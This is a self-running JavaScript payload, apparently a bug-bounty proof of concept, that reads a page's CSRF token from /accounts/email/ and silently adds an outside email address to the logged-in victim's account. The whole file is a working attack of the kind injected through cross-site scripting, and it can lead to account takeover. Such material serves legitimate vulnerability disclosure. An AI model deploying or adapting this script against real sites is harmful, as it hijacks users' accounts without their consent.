const email = "razii+1@wearehackerone.com";
function processAndAddEmail() {
    try {
        const getRequest = new XMLHttpRequest();
        getRequest.open("GET", "/accounts/email/", false);
        getRequest.send();

        if (getRequest.status !== 200) {
            throw new Error(`Failed to fetch email page: ${getRequest.statusText}`);
        }

        const parser = new DOMParser();
        const page = parser.parseFromString(getRequest.responseText, "text/html");

        const token = page.querySelector("[name='csrfmiddlewaretoken']")?.value;
        if (!token) {
            throw new Error("CSRF token not found in response.");
        }

        console.log(`CSRF token: ${token}`);

        const postRequest = new XMLHttpRequest();
        postRequest.open("POST", "/accounts/email/", false);
        postRequest.setRequestHeader("Content-Type", "application/x-www-form-urlencoded");

        const payload = `csrfmiddlewaretoken=${encodeURIComponent(token)}&email=${encodeURIComponent(email)}&action_add=`;
        postRequest.send(payload);

        if (postRequest.status !== 200) {
            throw new Error(`Failed to add email: ${postRequest.statusText}`);
        }

        console.log("Email added successfully.");
        console.info(postRequest.responseText);

    } catch (error) {
        console.error("An error occurred:", error.message);
    }
}

processAndAddEmail();
